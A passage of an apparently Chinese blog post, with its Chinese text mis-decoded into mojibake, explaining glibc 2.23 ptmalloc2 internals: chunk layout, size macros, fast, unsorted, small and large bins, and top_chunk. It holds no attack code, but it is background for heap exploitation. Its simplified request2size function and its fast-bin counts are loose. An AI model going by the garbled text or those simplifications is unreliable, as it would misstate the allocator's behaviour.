·ä¸å½±å“<code>chunk</code>çš„å¤§å°ã€‚</p><p>åœ¨çœ‹mallocæºç çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå®å®šä¹‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå°±å¯ä»¥çœ‹åˆ°<code>chunksize</code>åœ¨å–å®é™…<code>size</code>çš„æ—¶å€™ä¸äº†ä¸€ä¸ª<code>0xfffffff8</code>ï¼Œå¿½ç•¥äº†æœ€ä½ä¸‰ä½ï¼Œ64ä½æ“ä½œç³»ç»Ÿåˆ™ä¼šå¿½ç•¥æœ€ä½å››ä½ã€‚</p><p>ä»¥ä¸‹ä¾‹å­ä¸º64ä½æ“ä½œç³»ç»Ÿ</p><p><code>chunk</code>æœ€å°çš„å¤§å°ä¸º<code>0x20</code>ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰<code>0x10</code>å¤§å°çš„<code>chunk</code>å‘¢ï¼Œè¿™ä¹ˆçœ‹æ¥<code>size</code>å äº†<code>8</code>å­—èŠ‚è¿˜èƒ½æœ‰8å­—èŠ‚ç»™ç”¨æˆ·å»å†™ä¼¼ä¹æ²¡é—®é¢˜ã€‚å¤§ä¸äº†æˆ‘è¶…è¿‡<code>8B</code>å†åˆ†é…<code>0x20</code>å¤§å°çš„å†…å­˜å˜›ï¼Œè¿™ä¸ªç–‘é—®å…ˆæ”¾ä¸€ä¸‹ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹è¿™æ ·çš„ç­–ç•¥å®ƒè¿˜æœ‰æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ã€‚</p><p>å¦‚æœä¸€ä¸ª<code>chunk</code>è¢«ç¡®å®šé‡Šæ”¾äº†ï¼Œé‚£ä¹ˆè¯¥ä»¥ä»€ä¹ˆæ–¹å¼å»ç®¡ç†ã€‚ä½ ä¼šæƒ³åˆ°å‰é¢æœ‰ä¸€ä¸ª<code>prev_inuse</code>ä½å¯ä»¥ç¡®å®šä¸€ä¸ªå †å—æ˜¯å¦è¢«é‡Šæ”¾ï¼Œä½ ä¼šæƒ³åˆ°æ”¹ä¸‹ä¸€ä¸ª<code>chunk</code>çš„æ ‡å¿—ä½å°±å¯ä»¥äº†ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªå†…å­˜å—å†æ¬¡è¢«éœ€è¦å‘¢ï¼Œéš¾é“å»éå†æ¯ä¸€ä¸ª<code>chunk</code>ï¼Œä¸€æ¥è¦çœ‹<code>size</code>ç¬¦ä¸ç¬¦åˆï¼ŒäºŒæ¥è¿˜è¦çœ‹å®ƒæœ‰æ²¡æœ‰è¢«ä½¿ç”¨ï¼Œè¿™æ ·æ—¶é—´å¼€é”€å¤ªå¤§äº†ã€‚å› ä¸ºç©ºé—²çš„<code>chunk</code>å¯èƒ½æ•£è½åœ¨å†…å­˜å„ä¸ªè§’è½ï¼Œç®¡ç†é›¶ç¢å†…å­˜æœ€å¥½çš„åŠæ³•å°±æ˜¯é“¾è¡¨ã€‚é“¾è¡¨è¿˜å¾—æœ‰è¡¨å¤´ï¼Œè¿™ä¸ªè¡¨å¤´å…¶å®å°±æ˜¯æˆ‘ä»¬çš„<code>main_arena</code>ä¸­çš„<code>bin</code>ã€‚å› æ­¤<code>chunk</code>ä¸Šè¿˜å¾—æœ‰ä¸€å—å†…å­˜æ˜¯æŒ‡é’ˆï¼ŒæŒ‡é’ˆåˆå äº†<code>8</code>ä¸ªå­—èŠ‚ã€‚</p><p>ä½†æ˜¯ä½ å¯èƒ½æƒ³åˆ°ï¼ŒæŒ‡é’ˆå®ƒåªåœ¨å—è¢«é‡Šæ”¾çš„æ—¶å€™æœ‰ç”¨å•Šï¼Œ<code>0x10</code>çš„å—ï¼Œä¸€ä¸ª<code>size</code>ï¼Œä¸€ä¸ªæŒ‡é’ˆï¼Œè¢«åˆ†é…çš„æ—¶å€™ç”¨æŒ‡é’ˆä½œä¸ºæ•°æ®åŸŸï¼Œè¢«é‡Šæ”¾çš„æ—¶å€™æŒ‡é’ˆç”¨äºé“¾å¼ç®¡ç†ã€‚è¿™æ ·å°±è§£å†³äº†ï¼Œè¿™æ ·ä¹Ÿçš„ç¡®æ²¡é—®é¢˜ã€‚ä½†æ˜¯çœ‹çœ‹å®ƒè¿™æ ·çš„åˆ†é…ç­–ç•¥è¿˜æœ‰æ²¡æœ‰é—®é¢˜ï¼Ÿå¦‚æœæˆ‘å¤šæ¬¡åˆ†é…<code>chunk</code>å¾ˆå°çš„å—ï¼Œ<code>free</code>ä¹‹åå®ƒä»¬ä¾¿åªèƒ½ç”¨äºåˆ†é…è¿™ä¹ˆå¤§çš„å†…å­˜äº†ã€‚å¦‚æœä¸åŠ å¦ä¸€ç§ç­–ç•¥ç»„ç»‡èµ·æ¥ï¼Œå¯¼è‡´å†…å­˜ç¢ç‰‡è¶Šæ¥è¶Šå¤šï¼Œå°±å®¹æ˜“è€—å°½ç³»ç»Ÿå†…å­˜ã€‚</p><p>é‚£ä¹ˆå°±æœ‰<code>ptmalloc</code>çš„åˆä¸€ä¸ªç­–ç•¥ï¼šå°½é‡åˆå¹¶ç‰©ç†ç›¸é‚»çš„<code>free_chunk</code>ã€‚å’±ä»¬å‰é¢ä¸€ç›´æåˆ°åˆ‡å‰²å†…å­˜å—ï¼Œåˆå¹¶å†…å­˜å—å°±æ˜¯åˆ‡å‰²çš„ä¸€ä¸ªé€†è¿‡ç¨‹ã€‚åœ¨åˆå¹¶çš„æ—¶å€™æˆ‘å¯èƒ½å‰é¢ä¼šæœ‰<code>free</code>çš„å†…å­˜å—ï¼Œåé¢ä¹Ÿä¼šæœ‰<code>free</code>çš„å†…å­˜å—ã€‚é‚£ä¹ˆæˆ‘æ€ä¹ˆåœ¨åªçŸ¥é“æˆ‘è‡ªèº«ä¿¡æ¯çš„æƒ…å†µä¸‹å‡†ç¡®æ‰¾åˆ°å‰åçš„<code>chunk</code>å…·ä½“åœ¨å“ªå‘¢ã€‚</p><p>æƒ³æ‰¾åˆ°åé¢çš„å¾ˆå®¹æ˜“ï¼Œæˆ‘çŸ¥é“æˆ‘è‡ªå·±æ‰€åœ¨çš„ä½ç½®ï¼ˆæŒ‡é’ˆï¼‰ï¼Œä¹ŸçŸ¥é“æˆ‘çš„<code>size</code>ï¼Œé‚£ä¹ˆç›¸åŠ å°±å¯ä»¥æ‰¾åˆ°åé¢çš„<code>size</code>äº†ã€‚é‚£ä¹ˆæˆ‘å¦‚ä½•æ‰¾å‰é¢çš„<code>size</code>åœ¨ä»€ä¹ˆä½ç½®å‘¢ï¼Ÿæ‰€ä»¥å°±ä¸å¾—ä¸å†å¼€è¾Ÿä¸€ä¸ªå†…å­˜æ¥å­˜å‰ä¸€ä¸ª<code>chunk</code>çš„ä¿¡æ¯äº†ã€‚é€šè¿‡<code>prev_inuse</code>ä½æˆ‘å¾ˆå®¹æ˜“å¾—çŸ¥å‰ä¸€ä¸ª<code>chunk</code>æœ‰æ²¡æœ‰è¢«<code>free</code>ï¼Œä½†æ˜¯æˆ‘å¹¶ä¸çŸ¥é“å‰ä¸€ä¸ª<code>chunk</code>çš„å¤§å°å•Šã€‚æ‰€ä»¥åœ¨ä¸€ä¸ª<code>chunk</code>çš„ç»“æ„ä½“ï¼Œåœ¨sizeä¹‹å‰è¿˜ä¼šæœ‰ä¸€ä¸ª<code>prev_size</code>ã€‚ä¸å‰é¢é‚£ä¸ªæŒ‡é’ˆåŒç†ï¼Œæˆ‘åªæœ‰åœ¨å‰ä¸€ä¸ªå—è¢«<code>free</code>éœ€è¦åˆå¹¶çš„æ—¶å€™æ‰ä¼šæƒ³çœ‹çœ‹å®ƒåœ¨å“ªï¼Œä»–è¦æ˜¯éƒ½è¿˜åœ¨ç”¨æˆ‘éƒ½æ²¡å¿…è¦å»ä½¿ç”¨è¿™ä¸ª<code>prev_size</code>å­—æ®µäº†ã€‚ä½†æ˜¯è¦æ³¨æ„ï¼Œè¿™ä¸ª<code>prev_size</code>æ˜¯æœåŠ¡äºä¸Šä¸€ä¸ª<code>chunk</code>çš„ã€‚æ‰€ä»¥ä¸€ä¸ªchunkçš„ç»“æ„ä½“å°±æœ‰<code>0x10</code>ä¸ªä¸å¾—ä¸åˆ†é…çš„å­—èŠ‚ï¼Œè€Œä¸”è‡ªå·±è¿˜ä¸èƒ½ç”¨ã€‚å› æ­¤<code>0x10</code>çš„<code>chunk</code>å°±æ²¡æœ‰æ„ä¹‰äº†ã€‚æ‰€ä»¥æºç ä¸­ä¹Ÿä¼šæ‰¾åˆ°è¿™æ ·çš„å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE 4*SIZE_SZ</span></span><br></pre></td></tr></table></figure><p>è¯´äº†è¿™ä¹ˆå¤šäº†ï¼Œ<code>ptmalloc</code>çš„ç­–ç•¥å¤§è‡´æ€»ç»“ä¸€ä¸‹å°±æ˜¯ï¼š</p><ol><li><p>ä¸€æ¬¡ç³»ç»Ÿè°ƒç”¨ä¼šåˆ†é…å¤§å—å†…å­˜</p></li><li><p>ç¨‹åºç»“æŸåç»Ÿä¸€å½’è¿˜å†…å­˜ç»™æ“ä½œç³»ç»Ÿ</p></li><li><p>æ–¹ä¾¿ç®¡ç†ï¼Œå†…å­˜åˆ†é…å°½é‡å¯¹é½ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„sizeä¸ºæŸæŸæ•´å€æ•°</p></li><li><p>å°½é‡åˆ†é…æœ€å°èƒ½æ»¡è¶³çš„å†…å­˜å—</p></li><li><p>é“¾å¼ç®¡ç†ç©ºé—²ç©ºé—´ï¼Œé€‚å½“çš„æ—¶å€™åˆå¹¶ç‰©ç†ç›¸é‚»çš„<code>chunk</code></p></li></ol><p>è€Œä¸”æ ¹æ®ä»¥ä¸Šåˆ†ææˆ‘ä»¬å¯ä»¥å¾—å‡ºä¸€äº›å…³äº<code>chunk</code>çš„ç»“æ„ä½“ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> prev_size;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    chunk *fd;</span><br><span class="line">    chunk *bk;<span class="comment">//å› ä¸ºé“¾å¼ç®¡ç†è¿˜æœ‰å¯èƒ½æ˜¯åŒå‘é“¾è¡¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å¤§è‡´å°±æ˜ç™½äº†<code>ptmalloc</code>çš„åˆ†é…æ–¹å¼ã€‚</p><h2 id="ptmalloc2çš„å…·ä½“åˆ†é…ç­–ç•¥"><a href="#ptmalloc2çš„å…·ä½“åˆ†é…ç­–ç•¥" class="headerlink" title="ptmalloc2çš„å…·ä½“åˆ†é…ç­–ç•¥"></a>ptmalloc2çš„å…·ä½“åˆ†é…ç­–ç•¥</h2><p>å‰é¢æˆ‘ä»¬è®²åˆ°äº†ï¼Œå¯¹äºç©ºé—²å—ä½¿ç”¨äº†é“¾å¼ç®¡ç†æ–¹å¼ã€‚ä½†æ˜¯å¯¹äºä¸åŒå¤§å°çš„<code>chunk</code>ï¼Œå®ƒåˆæœ‰ç»†åˆ†ã€‚è¿™é‡Œå…ˆç»™ä¸€ä¸ªæ¦‚å¿µï¼š<code>bin</code>ï¼Œå­—é¢æ„ä¹‰åƒåœ¾æ¡¶ï¼Œç”¨äºè£…<code>free_chunk</code>çš„åƒåœ¾æ¡¶ï¼Œåœ¨è¿™é‡Œå¯ä»¥ç†è§£ä¸ºé“¾è¡¨è¡¨å¤´ã€‚</p><p>ä»¥ä¸‹å‡ä»¥<code>glibc 2.23</code>ç‰ˆæœ¬è§£æ</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>å¯¹äº<code>size</code>è¾ƒå°çš„<code>free_chunk</code>ï¼Œæˆ‘ä»¬è®¤ä¸ºå®ƒå¾ˆå¿«å°±ä¼šè¢«å†æ¬¡ç”¨åˆ°ï¼Œå› æ­¤åœ¨<code>free</code> <code>0x20~0x80</code>å¤§å°çš„<code>chunk</code>æ—¶ï¼Œæˆ‘ä»¬ä¼šæŠŠå®ƒæ‰”è¿›<code>fast bin</code>é‡Œé¢ï¼Œå­—é¢æ„ä¹‰ï¼Œé‡Œé¢å­˜çš„<code>free_chunk</code>å¾ˆå¿«ä¼šè¢«å†æ¬¡ç”¨åˆ°ã€‚<code>fast bin</code> ç®¡ç†<code>free_chunk</code>é‡‡ç”¨å•é“¾è¡¨æ–¹å¼ï¼Œå¹¶ä¸”ç¬¦åˆåè¿›å…ˆå‡ºï¼ˆ<code>FILO</code>ï¼‰çš„åŸåˆ™ï¼Œæ¯”å¦‚ä»¥ä¸‹ç¨‹åºæ®µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">y=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(x);</span><br><span class="line"><span class="built_in">free</span>(y);</span><br><span class="line">z=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">w=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆzä¼šå¾—åˆ°yçš„æŒ‡é’ˆï¼Œwä¼šå¾—åˆ°xçš„æŒ‡é’ˆã€‚</p><p>å¹¶ä¸”<code>fast bin</code>çš„<code>chunk</code>çš„ä¹‹åçš„<code>chunk</code> <code>prev_inuse</code>ä½æ°¸è¿œä¸º1ã€‚ä¹Ÿå°±æ˜¯è¯´å®ƒæ°¸è¿œè¢«è§†ä¸ºåœ¨ä½¿ç”¨ä¸­ï¼Œä½†æ˜¯é€šå¸¸è¿™ä¸ªä½¿ç”¨ä¸­æ˜¯ç”¨äºæ£€æµ‹å‚ä¸å‚ä¸ç‰©ç†ç›¸é‚»<code>chunk</code>çš„åˆå¹¶ï¼Œæ‰€ä»¥ä¸ä¼šå‚ä¸ç‰©ç†ç›¸é‚»çš„<code>chunk</code>çš„åˆå¹¶ï¼Œä¹Ÿä¸ä¼šè¢«åˆ‡å‰²ã€‚å®ƒçš„åŒ¹é…è§„åˆ™å°±æ˜¯ï¼Œå®šé‡åŒ¹é…ã€‚æ¯”å¦‚æˆ‘æƒ³è¦ä¸€ä¸ª<code>0x30</code>çš„<code>chunk</code>ï¼Œæ²¡æœ‰å°±æ˜¯æ²¡æœ‰ï¼Œæ²¡æœ‰æˆ‘å°±æ‰¾å…¶å®ƒçš„ï¼Œä¸ä¼šè¯´<code>0x40</code>å¥½åƒè¿˜æŒºåˆé€‚å°±æ‹¿äº†ï¼Œä¸ä¼šã€‚</p><p><code>fast bin</code>ä¸€å…±æœ‰<code>10</code>ä¸ªï¼Œ<code>main_arena</code>ç»“æ„ä½“ä¸­ï¼Œç”¨<code>fastbinsY</code>æ¥å­˜å‚¨æ¯ä¸€ä¸ª<code>fast bin</code>çš„é“¾è¡¨å¤´éƒ¨ï¼Œ32ä½ç³»ç»Ÿä¸­ï¼Œ<code>fast bin</code>ï¼Œä»0x10å¼€å§‹åˆ°<code>0x40</code>ï¼Œæœ‰7ç§<code>fast bin</code>ï¼Œ64ä½ç³»ç»Ÿä»<code>0x20</code>å¼€å§‹åˆ°<code>0x80</code>ï¼Œä¹Ÿæ˜¯ä¸ƒç§<code>fast bin</code>ã€‚å•ä¸ª<code>fast bin</code>é“¾è¡¨ä¸Šçš„<code>chunk</code>å¤§å°ä¸€å®šä¸¥æ ¼ç›¸ç­‰ã€‚</p><p>ä¸€å®šæƒ…å†µä¸‹å¯ä»¥ä¿®æ”¹<code>global_max_fast</code>çš„å€¼æ¥è°ƒæ•´<code>fast bin</code>çš„ä¸ªæ•°ï¼Œ64ä½ç³»ç»Ÿä¸‹è¿™ä¸ªå€¼é€šå¸¸ä¸º<code>0x80</code>ï¼Œä»£è¡¨å°äºç­‰äº<code>0x80</code>çš„<code>chunk</code>éƒ½ä¸º<code>fast bin</code>ã€‚</p><p>å…¶ä½™çš„é“¾è¡¨å¤´éƒ¨éƒ½åœ¨<code>bin</code>æ•°ç»„å½“ä¸­ã€‚å¹¶ä¸”ç”±äºåªæœ‰<code>fast bin</code>æ˜¯å•é“¾è¡¨ç»“æ„ï¼Œå…¶ä½™<code>bin</code>éƒ½æ˜¯åŒå‘é“¾è¡¨ç»“æ„ï¼Œ<code>bin</code>ä¼šæˆå¯¹å‡ºç°ã€‚</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>å¯¹äºé<code>fast bin</code>å¤§å°çš„<code>chunk</code>ï¼Œè¢«é‡Šæ”¾æ—¶ä¼šé¦–å…ˆè¿›å…¥<code>unsorted bin</code>ã€‚<code>unsorted bin</code>åœ¨ç‰¹å®šçš„æ—¶å€™ä¼šè¿›å…¥<code>small bin</code> å’Œ <code>large bin</code>ã€‚</p><p>é<code>fast bin</code>çš„<code>bin</code>éƒ½æ˜¯ç”¨ä¸€å¯¹<code>bin</code>æŒ‡é’ˆæ¥æè¿°çš„ï¼Œè¿™ä¸¤ä¸ª<code>bins</code>ä¹Ÿè¦çœ‹æˆä¸€ä¸ª<code>chunk</code>ï¼Œç„¶ååˆå§‹å®ƒä»¬çš„<code>fd</code>å’Œ<code>bk</code>éƒ½æŒ‡å‘è‡ªèº«çš„<code>prev_size</code>é‚£ä¸ªä½ç½®ã€‚æ¯”å¦‚<code>main_arena+104</code>è¿™ä¸ªåœ°æ–¹æ˜¯<code>bin</code>æ•°ç»„çš„ç¬¬ä¸€ä¸ªï¼Œç„¶åå‘¢<code>main_arena+104</code>å’Œ<code>main_arena+112</code>åˆ†åˆ«å°±æ˜¯<code>unsorted bin</code>çš„å¤´éƒ¨ï¼Œå®ƒä»¬æœ¬èº«è™½ç„¶ä¸æ˜¯<code>chunk</code>ï¼Œä½†æ˜¯è¦ç†è§£å®ƒä»¬çš„åˆå§‹çŠ¶æ€è¿˜æ˜¯å¾—çœ‹æˆä¸€ä¸ª<code>chunk</code>ã€‚æ‰€ä»¥<code>main_arena+104</code>å’Œ<code>main_arena+112</code>çš„åˆå§‹å€¼å°±æ˜¯<code>main_arena+88</code>ã€‚å¦‚å›¾ï¼š</p><p><img src="/2022/01/27/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/1.png" alt="1"></p><p>è®¾ç½®è¿™ä¸€ä¸ª<code>bin</code>çš„ä¸»è¦ç›®çš„æ˜¯æ‰®æ¼”ä¸€ä¸ªç¼“å­˜å±‚çš„è§’è‰²ä»¥åŠ å¿«åˆ†é…å’Œé‡Šæ”¾çš„æ“ä½œï¼Œé“¾è¡¨ä¸­<code>chunk</code>å¤§å°ä¸ä¸€å®šç›¸ç­‰ä¸”æ— åºæ’åˆ—ã€‚</p><p>å½“éœ€è¦æ£€æŸ¥<code>unsorted bin</code>çš„æ—¶å€™ï¼Œä¼šéå†æ•´ä¸ªé“¾è¡¨ï¼Œå¯»æ‰¾ç¬¬ä¸€ä¸ªèƒ½æ»¡è¶³çš„<code>chunk</code>å¤§å°åˆ‡å‰²ã€‚å¦‚æœåˆ‡å‰²åçš„å¤§å°ä¸è¶³<code>2*SIZE_SZ</code>ï¼Œåˆ™ä¸ä¼šåˆ‡å‰²ï¼Œè€Œæ˜¯å°†æ•´ä¸ªå †å—è¿”å›ç»™ç”¨æˆ·ä½¿ç”¨ã€‚</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p>ä¸€å…±æœ‰<code>62</code>ä¸ªï¼Œä»æœ€å°çš„<code>chunk</code>å¼€å§‹ï¼Œå…¬å·®ä¸º<code>SIZE_SZ*2</code>ï¼ŒåŒé“¾è¡¨ç®¡ç†ã€‚å®ƒçš„ç‰¹ç‚¹ä¹Ÿæ˜¯è·Ÿfast binä¸€æ ·ï¼Œå•æ¡é“¾è¡¨<code>chunk</code>å¤§å°ç›¸ç­‰ï¼Œä½†æ˜¯å®ƒä¼šå‚ä¸åˆå¹¶ï¼Œåˆ‡å‰²ã€‚å…ˆè¿›å…ˆå‡ºï¼ˆ<code>FIFO</code>ï¼‰çš„ç­–ç•¥ã€‚å®ƒè¡¨ç¤ºçš„èŒƒå›´å°±æ˜¯<code>4*SIZE_SZ~126*SIZE_SZ</code></p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><p><code>large bin</code>ä¸<code>small bin</code>ä¸ä¸€æ ·ï¼Œ<code>large bin</code>è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªèŒƒå›´ã€‚ä¸€å…±æœ‰<code>63</code>ä¸ª(å‡è®¾ä¸‹æ ‡<code>0~62</code>)ï¼Œä»<code>small bin</code>æœ€å°ä¸èƒ½è¡¨ç¤ºçš„<code>chunk</code>å¼€å§‹ï¼Œå¤§åˆ°æ— ç©·ã€‚</p><p>å®ƒè¡¨ç¤ºçš„èŒƒå›´ç±»ä¼¼ä¸€ä¸ªç­‰å·®æ•°åˆ—ã€‚</p><table><thead><tr><th>èµ·ä¸‹æ ‡</th><th>æ­¢ä¸‹æ ‡</th><th>å…¬å·®</th></tr></thead><tbody><tr><td>0</td><td>31</td><td>16*SIZE_SZ</td></tr><tr><td>32</td><td>47</td><td>32*SIZE_SZ</td></tr><tr><td>48</td><td>55</td><td>64*SIZE_SZ</td></tr><tr><td>56</td><td>59</td><td>128*SIZE_SZ</td></tr><tr><td>60</td><td>61</td><td>256*SIZE_SZ</td></tr><tr><td>62</td><td>62</td><td>âˆ</td></tr></tbody></table><p>æœ€å°çš„<code>large bin</code>æ˜¯<code>small bin</code>çš„æœ€å°ä¸èƒ½è¡¨ç¤ºçš„å¤§å°ã€‚</p><p>æ‰€ä»¥<code>large bin</code>ä»<code>128*SIZE_SZ</code>å¼€å§‹ã€‚é‚£ä¹ˆä¸‹æ ‡ä¸º<code>0</code>çš„<code>large bin</code>è¡¨ç¤ºçš„èŒƒå›´å°±æ˜¯<code>128*SIZE_SZ~144*SIZE_SZ</code>(å·¦é—­å³å¼€)ï¼ŒåŒç†ä¸‹æ ‡ä¸º1çš„<code>large bin</code>è¡¨ç¤ºçš„èŒƒå›´å°±æ˜¯<code>144*SIZE_SZ~160*SIZE_SZ</code>ï¼Œä»¥æ­¤ç±»æ¨ï¼Œç­‰åˆ°<code>32</code>çš„æ—¶å€™å°±åœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ <code>32*SIZE_SZ</code>ä½œä¸ºå³å¼€åŒºé—´</p><p>å®ƒä¼šä»¥äºŒç»´åŒå‘é“¾è¡¨è¿›è¡Œç»´æŠ¤ï¼Œå¯¹äº<code>bin</code>ä¸­æ‰€æœ‰çš„<code>chunk</code>ï¼Œç›¸åŒå¤§å°çš„<code>chunk</code>ç”¨<code>fd</code>å’Œ<code>bk</code>æŒ‡é’ˆç›¸è¿ï¼Œå¯¹äºä¸åŒå¤§å°çš„<code>chunk</code>ï¼Œé‡‡ç”¨<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>æŒ‡é’ˆè¿æ¥ã€‚å¹¶ä¸”æ²¿ç€<code>fd_nextsize</code>æŒ‡é’ˆï¼Œ<code>chunk</code>å¤§å°é€’å¢ã€‚</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top_chunk"></a>top_chunk</h3><p>æˆ‘ä»¬ä¹‹å‰è¯´è¿‡ï¼Œç¬¬ä¸€æ¬¡<code>malloc</code>çš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šç»™æˆ‘ä»¬<code>0x21000B</code>çš„å†…å­˜ï¼Œå®ƒæ˜¯ä½œä¸ºä¸€ä¸ª<code>top_chunk</code>å­˜åœ¨çš„ï¼Œå¯ä»¥æŠŠ<code>top_chunk</code>çœ‹æˆ<code>heap</code>çš„è¾¹ç•Œã€‚<code>top_chunk</code>çš„åœ°å€ä¼šè¢«è®°å½•åœ¨main_arena+88çš„ä½ç½®ã€‚<code>gdb</code>ä¸­é€šè¿‡<code>p/x main_arena</code>çš„å‘½ä»¤ä¹Ÿå¯ä»¥æŸ¥çœ‹<code>main_arena</code> çš„å…·ä½“ç»“æ„ã€‚</p><h3 id="åˆ†é…æµç¨‹"><a href="#åˆ†é…æµç¨‹" class="headerlink" title="åˆ†é…æµç¨‹"></a>åˆ†é…æµç¨‹</h3><p>é¦–å…ˆç”¨æˆ·<code>malloc</code>è¯·æ±‚ä¸€ä¸ªå†…å­˜ï¼Œå…ˆå°†è¯·æ±‚çš„å†…å­˜å¤§å°è½¬æ¢æˆ<code>chunk</code>çš„å¤§å°ï¼Œé€šè¿‡ä»¥ä¸‹å®å®šä¹‰è½¬æ¢ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚é€»è¾‘å°±æ˜¯å¯»æ‰¾ä¸€ä¸ªæœ€å°èƒ½æ»¡è¶³çš„<code>chunksize</code>ä½œä¸º<code>chunk</code>å¤§å°ã€‚</p><p>ä»€ä¹ˆæ˜¯æœ€å°èƒ½æ»¡è¶³å‘¢ï¼Œæˆ‘ä»¬çœ‹çœ‹ä¸€ä¸ª<code>size=0x20</code>çš„<code>chunk</code>èƒ½æœ‰å¤šå°‘åŒºåŸŸç»™ç”¨æˆ·å†™ï¼š<code>0x20</code>å­—èŠ‚åˆ†åˆ«ä¸º<code>prev_size</code>ï¼Œ<code>size</code>ï¼Œ<code>fd</code>å’Œ<code>bk</code>ï¼Œ<code>prev_size</code>å’Œ<code>size</code>éƒ½ä¸å…è®¸å†™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å†™<code>fd</code>å’Œ<code>bk</code>ï¼Œä»¥åŠä¸‹ä¸€ä¸ªå—çš„<code>prev_size</code>ï¼Œå‰é¢æˆ‘ä»¬ä¹Ÿè¯´è¿‡ï¼Œå½“è¿™ä¸ªå—æ²¡æœ‰è¢«<code>free</code>çš„æ—¶å€™ï¼Œå®ƒçš„<code>fd</code>,<code>bk</code>ä»¥åŠä¸‹ä¸€ä¸ª<code>chunk</code>çš„<code>prevsize</code>ä½éƒ½æ˜¯å¯ä»¥ç»™ç”¨æˆ·ä»»æ„å†™æ•°æ®çš„ï¼Œæ‰€ä»¥<code>size=0x20</code>ï¼Œæˆ‘ä»¬å¯ä»¥å†™çš„æ•°æ®æ®µä¸º<code>0x18</code>ã€‚æœ€å°èƒ½æ»¡è¶³å°±æ˜¯è¯´ï¼Œå½“æˆ‘è¯·æ±‚çš„å†…å­˜å°äºç­‰äº<code>0x18</code>çš„æ—¶å€™ï¼Œæˆ‘ç»™ä½ <code>size=0x20</code>çš„<code>chunk</code>ï¼Œä¸€æ—¦å¤šäº†å°±ç»§ç»­åŠ <code>0x10</code>ï¼Œä¹Ÿå°±æ˜¯<code>2*SIZE_SZ</code>ã€‚è¿™é‡Œç”¨äº†å…¶å®ƒå®å®šä¹‰å»æè¿°å®ƒæˆ‘ä»¬å°šä¸”ä¸ç®¡ï¼Œå¦‚æœç”¨ä¸€ä¸ªå‡½æ•°æ¥å®ç°å®ƒçš„è¯å¤§æ¦‚å°±æ˜¯è¿™æ ·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">request2size</span><span class="params">(<span class="keyword">size_t</span> req)</span></span>&#123;</span><br><span class="line">    chunk_size=SIZE_SZ*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span>(chunk_size&lt;req)chunk_size+=<span class="number">2</span>*SIZE_SZ;</span><br><span class="line">    <span class="keyword">return</span> chunk_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨åˆ†é…çš„æ—¶å€™æˆ‘ä»¬å°½é‡é€‰æ‹©<code>0x18</code>,<code>0x28</code>è¿™æ 